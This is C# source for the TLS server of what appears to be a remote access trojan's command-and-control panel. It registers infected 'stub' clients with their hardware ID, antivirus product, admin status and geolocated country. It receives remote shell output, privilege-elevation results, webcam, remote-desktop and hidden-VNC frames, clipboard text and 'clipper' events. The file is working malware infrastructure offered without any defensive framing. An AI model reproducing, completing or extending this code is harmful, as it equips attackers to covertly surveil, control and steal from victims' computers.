using System.Collections.Concurrent;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using Newtonsoft.Json;
using SeroServer.Data;
using SeroServer.Protocol;

namespace SeroServer.Net;

public class TlsServer
{
    private TcpListener? _listener;
    private X509Certificate2? _cert;
    private CancellationTokenSource? _cts;
    private readonly DataStore _store;
    private static readonly HttpClient _http = new() { Timeout = TimeSpan.FromSeconds(5) };
    private readonly ConcurrentDictionary<string, (string country, string code)> _countryCache = new();
    private readonly SemaphoreSlim _geoLock = new(1, 1);
    public int MaxConnectedClients { get; set; } = 100_000;

    public string AuthKey { get; set; } = string.Empty;
    public Func<string>? GetClientIdPrefix { get; set; }
    public ConcurrentDictionary<string, ConnectedClient> ConnectedClients { get; } = new();
    public event Action<ConnectedClient>? ClientConnected;
    public event Action<ConnectedClient>? ClientDisconnected;
    public event Action<string, string>? ShellOutputReceived;
    public event Action<string, string>? AutoTaskShellOutputReceived;
    public event Action<string, ElevationResultData>? ElevationResultReceived;
    public event Action<string, string>? RdpFrameReceived;      // clientId, rawJson
    public event Action<string, string>? WcamFrameReceived;     // clientId, rawJson
    public event Action<string, string>? RdpClipboardReceived;  // clientId, text
    public event Action<string, string>? HvncFrameReceived;     // clientId, rawJson
    public event Action<string, ClipperDetectedData>? ClipperDetectedReceived; // clientId, data
    public event Action<string>? OnLog;

    public bool IsRunning { get; private set; }
    public int  Port      { get; private set; }

    // Per-(client,packetType) dynamic handlers — used by feature windows
    private readonly ConcurrentDictionary<(string, PacketType), Action<Packet>> _handlers = new();

    public void RegisterHandler(string clientId, PacketType type, Action<Packet> handler)
        => _handlers[(clientId, type)] = handler;

    public void UnregisterHandler(string clientId, PacketType type)
        => _handlers.TryRemove((clientId, type), out _);

    public TlsServer(DataStore store) => _store = store;

    public void Start(int port)
    {
        if (IsRunning) return;
        Port = port;

        _cert = CertificateHelper.GetOrCreateCertificate();
        _cts = new CancellationTokenSource();
        _listener = new TcpListener(IPAddress.Any, port);
        _listener.Start();
        IsRunning = true;

        Log($"TLS Server started on port {port}");
        _ = AcceptLoop(_cts.Token);
    }

    public void Stop()
    {
        if (!IsRunning) return;
        _cts?.Cancel();
        _listener?.Stop();
        IsRunning = false;

        foreach (var client in ConnectedClients.Values.ToList())
        {
            try { client.Cts.Cancel(); client.Stream?.Close(); } catch { }
        }
        ConnectedClients.Clear();
        Log("Server stopped.");
    }

    public async Task SendToClient(string clientId, Packet packet)
    {
        if (ConnectedClients.TryGetValue(clientId, out var client) && client.Stream != null)
        {
            await client.WriteLock.WaitAsync();
            bool failed = false;
            try
            {
                // Re-check stream after acquiring lock — client may have disconnected
                if (client.Stream == null) return;
                await Packet.WriteToStreamAsync(client.Stream, packet);
            }
            catch { failed = true; }
            finally { client.WriteLock.Release(); }
            // Disconnect AFTER releasing lock to avoid deadlock with read loop
            if (failed) DisconnectClient(clientId);
        }
    }

    public Task SendToAll(Packet packet)
    {
        // Parallel sends — each client has its own WriteLock so there's no contention
        var tasks = ConnectedClients.Keys.ToList()
            .Select(id => SendToClient(id, packet));
        return Task.WhenAll(tasks);
    }

    public void DisconnectClient(string clientId)
    {
        if (ConnectedClients.TryRemove(clientId, out var client))
        {
            // Dispose (not just Close) to free the socket handle immediately
            try { client.Cts.Cancel(); client.Stream?.Dispose(); } catch { }
            _store.RecordDisconnection(client.Hwid);
            Log($"Client {client.Id} ({client.Username}@{client.IP}) disconnected.");
            ClientDisconnected?.Invoke(client);
        }
    }

    // ── Private ─────────────────────────────────────

    private async Task AcceptLoop(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            try
            {
                var tcp = await _listener!.AcceptTcpClientAsync(ct);
                _ = HandleClient(tcp, ct);
            }
            catch (OperationCanceledException) { break; }
            catch (Exception ex) { Log($"Accept error: {ex.Message}"); }
        }
    }

    private async Task HandleClient(TcpClient tcp, CancellationToken serverCt)
    {
        var ep = tcp.Client.RemoteEndPoint as IPEndPoint;
        var ip = ep?.Address.ToString() ?? "?";
        ConnectedClient? client = null;

        SslStream? sslStream = null;
        try
        {
            sslStream = new SslStream(tcp.GetStream(), false);
            await sslStream.AuthenticateAsServerAsync(_cert!);

            // Wait for ClientInfo packet
            var infoPacket = await Packet.ReadFromStreamAsync(sslStream, serverCt);
            if (infoPacket == null || infoPacket.Type != PacketType.ClientInfo)
            {
                Log($"Client {ip} sent invalid handshake (expected ClientInfo, got {infoPacket?.Type}).");
                tcp.Close();
                return;
            }

            ClientInfoData? info;
            try { info = JsonConvert.DeserializeObject<ClientInfoData>(infoPacket.Data); }
            catch { info = null; }
            if (info == null)
            {
                Log($"Client {ip} sent malformed ClientInfo JSON.");
                tcp.Close();
                return;
            }

            // Auth key verification (always required)
            if (string.IsNullOrEmpty(info.AuthKey) || info.AuthKey != AuthKey)
            {
                Log($"[AUTH] Rejected {ip}: invalid auth key.");
                tcp.Close();
                return;
            }

            string clientId;
            bool knownHwid = _store.AllClients.TryGetValue(info.Hwid, out var existingRecord);
            // Reuse saved ID only when the prefix matches — a new build with a different
            // IdPrefix must get a fresh ID so the display updates correctly.
            bool reuseId = knownHwid
                && !string.IsNullOrEmpty(existingRecord!.AssignedId)
                && (string.IsNullOrEmpty(info.IdPrefix)
                    || existingRecord.AssignedId.StartsWith(info.IdPrefix + "-", StringComparison.Ordinal));

            if (reuseId)
            {
                clientId = existingRecord!.AssignedId;
            }
            else
            {
                var prefix = !string.IsNullOrEmpty(info.IdPrefix)
                    ? info.IdPrefix
                    : (!knownHwid ? GetClientIdPrefix?.Invoke() ?? "" : "");
                clientId = string.IsNullOrEmpty(prefix)
                    ? Guid.NewGuid().ToString("N")[..8]
                    : $"{prefix}-{Guid.NewGuid().ToString("N")[..8]}";
            }

            client = new ConnectedClient
            {
                Id = clientId,
                Hwid = info.Hwid,
                InstanceId = info.InstanceId,
                Username = info.Username,
                IP = ip,
                OS = info.OS,
                MachineName = info.MachineName,
                IsAdmin = info.IsAdmin,
                Payload = info.Payload,
                Antivirus = info.Antivirus,
                Stream = sslStream,
                Port = Port,
            };

            // Resolve country from IP
            var (country, countryCode) = await ResolveCountryAsync(ip);
            client.Country = country;
            client.CountryCode = countryCode;

            // Restore tag + first seen from persistent record
            var record = _store.RecordConnection(client);
            client.Tag = record.Tag;
            client.FirstSeen = record.FirstSeen;

            // Persist the assigned ID (or overwrite when prefix changed)
            if (record.AssignedId != clientId)
                _store.SetAssignedId(client.Hwid, clientId);

            // Evict an existing connection from the same HWID only when it's the same build
            // (same IdPrefix). Two stubs with different IdPrefixes running on the same machine
            // are independent programs and must coexist in the client list.
            static string PrefixOf(string id) => id.Contains('-') ? id[..id.IndexOf('-')] : "";
            string newPfx   = info.IdPrefix ?? "";
            var stale = ConnectedClients.Values.FirstOrDefault(c =>
                c.Hwid == client.Hwid &&
                string.Equals(PrefixOf(c.Id), newPfx, StringComparison.Ordinal));

            // FIX: Add new client BEFORE disconnecting stale to avoid the race where the
            // UI sees a ClientDisconnected event with no matching ClientConnected afterwards.
            // Max clients check accounts for the fact that the stale slot is about to free up.
            int effectiveCount = ConnectedClients.Count - (stale != null ? 1 : 0);
            if (effectiveCount >= MaxConnectedClients)
            {
                Log($"[LIMIT] Rejected {ip} (max {MaxConnectedClients} clients reached).");
                tcp.Close();
                return;
            }

            ConnectedClients[client.Id] = client;
            if (stale != null)
                DisconnectClient(stale.Id);
            Log($"Client {client.Id} connected ({info.Username}@{ip}, {client.Country})");
            ClientConnected?.Invoke(client);

            // Read loop
            using var linkedCts = CancellationTokenSource.CreateLinkedTokenSource(serverCt, client.Cts.Token);
            while (!linkedCts.Token.IsCancellationRequested)
            {
                var packet = await Packet.ReadFromStreamAsync(sslStream, linkedCts.Token);
                if (packet == null) break;

                switch (packet.Type)
                {
                    case PacketType.Heartbeat:
                        client.LastHeartbeat = DateTime.UtcNow;
                        await client.WriteLock.WaitAsync(linkedCts.Token);
                        try
                        {
                            await Packet.WriteToStreamAsync(sslStream, new Packet { Type = PacketType.HeartbeatAck }, linkedCts.Token);
                            client.PingSentAt = DateTime.UtcNow;
                            await Packet.WriteToStreamAsync(sslStream, new Packet
                            {
                                Type = PacketType.Ping,
                                Data = client.PingSentAt.Ticks.ToString()
                            }, linkedCts.Token);
                        }
                        finally { client.WriteLock.Release(); }
                        break;

                    case PacketType.Pong:
                        if (long.TryParse(packet.Data, out long ticks))
                        {
                            var rtt = DateTime.UtcNow - new DateTime(ticks, DateTimeKind.Utc);
                            client.PingMs = (int)rtt.TotalMilliseconds;
                        }
                        break;

                    case PacketType.HardwareStats:
                        var hwStats = JsonConvert.DeserializeObject<HardwareStatsData>(packet.Data);
                        if (hwStats != null)
                        {
                            client.CpuUsage = hwStats.CpuUsage;
                            client.RamUsed  = hwStats.RamUsed;
                            client.RamTotal = hwStats.RamTotal;
                            if (!string.IsNullOrEmpty(hwStats.CpuName)) client.CpuName = hwStats.CpuName;
                            if (!string.IsNullOrEmpty(hwStats.GpuName)) client.GpuName = hwStats.GpuName;
                        }
                        break;

                    case PacketType.ClientInfo:
                        var updated = JsonConvert.DeserializeObject<ClientInfoData>(packet.Data);
                        if (updated != null)
                        {
                            client.OS = updated.OS;
                            client.MachineName = updated.MachineName;
                            client.IsAdmin = updated.IsAdmin;
                            if (!string.IsNullOrEmpty(updated.Payload))
                                client.Payload = updated.Payload;
                        }
                        break;

                    case PacketType.ShellOutput:
                        var shellData = JsonConvert.DeserializeObject<ShellOutputData>(packet.Data);
                        if (shellData != null)
                        {
                            _store.RecordActivity(client.Hwid, $"Shell output (exit={shellData.ExitCode})");
                            ShellOutputReceived?.Invoke(client.Id, shellData.Output);
                        }
                        break;

                    case PacketType.AutoTaskShellOutput:
                        var atShellData = JsonConvert.DeserializeObject<ShellOutputData>(packet.Data);
                        if (atShellData != null)
                            AutoTaskShellOutputReceived?.Invoke(client.Id, atShellData.Output);
                        break;

                    case PacketType.ElevationResult:
                        var elevData = JsonConvert.DeserializeObject<ElevationResultData>(packet.Data);
                        if (elevData != null)
                        {
                            _store.RecordActivity(client.Hwid, $"Elevation: {(elevData.Success ? "OK" : "FAILED")} - {elevData.Message}");
                            Log($"[UAC] {client.Id}: {(elevData.Success ? "Elevated" : "Failed")} - {elevData.Message}");
                            ElevationResultReceived?.Invoke(client.Id, elevData);
                        }
                        break;

                    case PacketType.ActiveWindow:
                        client.ActiveWindow = packet.Data;
                        break;
                    case PacketType.CameraStatus:
                        client.CameraStatus = packet.Data;
                        break;

                    case PacketType.RdpFrame:
                        RdpFrameReceived?.Invoke(client.Id, packet.Data);
                        break;

                    case PacketType.WcamFrame:
                    case PacketType.WcamDevices:
                        WcamFrameReceived?.Invoke(client.Id, packet.Data);
                        break;

                    case PacketType.RdpClipboard:
                        var clipMsg = JsonConvert.DeserializeObject<RdpClipboardData>(packet.Data);
                        if (clipMsg != null && !string.IsNullOrEmpty(clipMsg.Text))
                            RdpClipboardReceived?.Invoke(client.Id, clipMsg.Text);
                        break;

                    case PacketType.HvncFrame:
                        HvncFrameReceived?.Invoke(client.Id, packet.Data);
                        break;

                    case PacketType.ClipperDetected:
                        var clipDet = JsonConvert.DeserializeObject<ClipperDetectedData>(packet.Data);
                        if (clipDet != null)
                            ClipperDetectedReceived?.Invoke(client.Id, clipDet);
                        break;

                    default:
                        // Route to any dynamically registered handler (TCP/Startup/File/Mic/Fun windows)
                        if (_handlers.TryGetValue((client.Id, packet.Type), out var dynHandler))
                            try { dynHandler(packet); } catch { }
                        break;
                }
            }
        }
        catch (OperationCanceledException) { }
        catch (Exception ex)
        {
            if (client is { PendingUninstall: true })
                Log($"[+] Client {client.Id} ({client.Username}@{ip}) uninstalled successfully.");
            else if (client != null
                  && !ex.Message.Contains("decryption operation failed", StringComparison.OrdinalIgnoreCase)
                  && !ex.Message.Contains("authentication failed", StringComparison.OrdinalIgnoreCase))
                Log($"Client {client.Id} ({ip}) error: {ex.Message}");
        }
        finally
        {
            try { sslStream?.Close(); } catch { }
            tcp.Close();
            if (client != null) DisconnectClient(client.Id);
        }
    }

    private async Task<(string country, string code)> ResolveCountryAsync(string ip)
    {
        bool isLocal = string.IsNullOrEmpty(ip) || ip == "127.0.0.1" || ip == "::1" ||
            ip.StartsWith("192.168.") || ip.StartsWith("10.") || ip.StartsWith("172.");

        var lookupKey = isLocal ? "_public_" : ip;

        if (_countryCache.TryGetValue(lookupKey, out var cached))
            return cached;

        try
        {
            await _geoLock.WaitAsync();
            try
            {
                if (_countryCache.TryGetValue(lookupKey, out var cached2))
                    return cached2;

                var url = isLocal
                    ? "http://ip-api.com/json/?fields=country,countryCode"
                    : $"http://ip-api.com/json/{ip}?fields=country,countryCode";
                var json = await _http.GetStringAsync(url);
                var obj = JsonConvert.DeserializeObject<dynamic>(json);
                var country = (string?)obj?.country ?? "Unknown";
                var code = (string?)obj?.countryCode ?? "";
                var result = (country, code);
                _countryCache[lookupKey] = result;
                return result;
            }
            finally { _geoLock.Release(); }
        }
        catch
        {
            return (isLocal ? "Local" : "Unknown", "");
        }
    }

    private void Log(string msg)
    {
        _store.Log(msg);
        OnLog?.Invoke(msg);
    }
}
